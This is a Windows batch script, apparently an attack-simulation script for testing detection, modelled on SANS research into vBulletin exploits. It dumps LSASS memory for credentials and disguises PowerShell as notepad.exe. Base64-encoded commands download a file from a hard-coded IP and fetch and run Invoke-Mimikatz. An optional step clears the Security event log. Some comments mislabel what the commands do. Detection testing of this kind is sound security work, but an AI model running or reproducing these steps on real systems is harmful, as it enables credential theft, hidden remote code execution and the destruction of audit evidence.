@Echo off
echo.
echo It will take roughly 60 seconds for this script to complete. 
echo Failure messages are expected.
echo Please wait for user prompts.
echo.
Echo The following script will trigger events from the following research:
Echo https://isc.sans.edu/diary/vBulletin+Exploits+CVE202548827+CVE202548828/32006/
Echo.
Echo.
:: Process creates a test directory, copies powershell to that directory as notepad, the attempts to connect to a malicious URL and IP, then deletes the test directory.
:: powershell.exe Start-Process cmd.exe -Verb runAs
:: Echo y | powershell.exe Start-Process cmd.exe -Verb runAs
:: Escalates privileges without prompt (TA0002: Execution, TA0005: Evasion, T1059: Powershell)
powershell.exe Set-ExecutionPolicy Unrestricted
:: mkdir c:\test
Echo y | powershell.exe -exec bypass -enc bQBrAGQAaQByACAAYwA6AFwAdABlAHMAdAA= 
:: Creates a test directory on the local C: drive
for /f "tokens=2" %%a in ('tasklist /nh /fi "imagename eq lsass.exe"') do (
    rundll32 C:\Windows\System32\comsvcs.dll MiniDump %%a "C:\test\lsass.dmp" full
)
:: copy-item -path c:\windows\system32\windowspowershell\v1.0\powershell.exe -destination c:\test\notepad.exe
copy "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" "C:\test\notepad.exe"
:: Copies powershell.exe to the newly created test directory as a notepad application
:: Start-Process https://forum.vbulletin.com/forum/vbulletin-announcements/vbulletin-announcements_aa/4491049-security-patch-released-for-vbulletin-6-x-and-5-7-5
c:\test\notepad.exe -e UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAGgAdAB0AHAAcwA6AC8ALwBmAG8AcgB1AG0ALgB2AGIAdQBsAGwAZQB0AGkAbgAuAGMAbwBtAC8AZgBvAHIAdQBtAC8AdgBiAHUAbABsAGUAdABpAG4ALQBhAG4AbgBvAHUAbgBjAGUAbQBlAG4AdABzAC8AdgBiAHUAbABsAGUAdABpAG4ALQBhAG4AbgBvAHUAbgBjAGUAbQBlAG4AdABzAF8AYQBhAC8ANAA0ADkAMQAwADQAOQAtAHMAZQBjAHUAcgBpAHQAeQAtAHAAYQB0AGMAaAAtAHIAZQBsAGUAYQBzAGUAZAAtAGYAbwByAC0AdgBiAHUAbABsAGUAdABpAG4ALQA2AC0AeAAtAGEAbgBkAC0ANQAtADcALQA1AAoA
:: Starts the default browser and directs it to the malicious domain
:: powershell.exe -Command "(New-Object System.Net.WebClient).DownloadFile('http://169.150.203.14/nofile.exe', 'C:\nofile.exe')"
c:\test\notepad.exe -e KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACcAaAB0AHQAcAA6AC8ALwAxADYAOQAuADEANQAwAC4AMgAwADMALgAxADQALwBuAG8AZgBpAGwAZQAuAGUAeABlACcALAAgACcAQwA6AFwAbgBvAGYAaQBsAGUALgBlAHgAZQAnACkA
:: Attempts a HTTP web request to download a non-existing file from a malicious IP
:: powershell.exe -exec bypass powershell.exe -exec bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://169.150.203.14/PowerShellMafia/PowerSpolit/f650520c5b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.pls'); Invoke-Mimikatz -DumpCreds"
c:\test\notepad.exe -e IgBJAEUAWAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADYAOQAuADEANQAwAC4AMgAwADMALgAxADQALwBQAG8AdwBlAHIAUwBoAGUAbABsAE0AYQBmAGkAYQAvAFAAbwB3AGUAcgBTAHAAbwBsAGkAdAAvAGYANgA1ADAANQAyADAAYwA1AGIAMQAwADAANABkAGEAZgA4AGIAMwBlAGMAMAA4ADAAMAA3AGEAMABiADkANAA1AGIAOQAxADIANQAzAGEALwBFAHgAZgBpAGwAdAByAGEAdABpAG8AbgAvAEkAbgB2AG8AawBlAC0ATQBpAG0AaQBrAGEAdAB6AC4AcABsAHMAJwApADsAIABJAG4AdgBvAGsAZQAtAE0AaQBtAGkAawBhAHQAegAgAC0ARAB1AG0AcABDAHIAZQBkAHMAIgA=
:: Attempts to invoke mimikatz from a non-existent github repository (in order to steel credentials) 
:: remove-item c:\test -Recurse -Force
powershell.exe -exec bypass -enc cgBlAG0AbwB2AGUALQBpAHQAZQBtACAAYwA6AFwAdABlAHMAdAAgAC0AUgBlAGMAdQByAHMAZQAgAC0ARgBvAHIAYwBlAA==
:: removes the test directory and files that were created
echo.
echo.
set /p "userInput=Press x [& ENTER] to wipe the security event logs (for additional Impact TTP), any other key to skip this step: "
if /i not "%userInput%"=="x" exit /b
powershell.exe -exec bypass -enc QwBsAGUAYQByAC0ARQB2AGUAbgB0AEwAbwBnACAALQBMAG8AZwBOAGEAbQBlACAAUwBlAGMAdQByAGkAdAB5AAoA
:: optional Clear-EventLog -LogName Security after prompting
echo.
echo Script completed successfully. Pressing any key will close this window...
echo.
pause
Exit
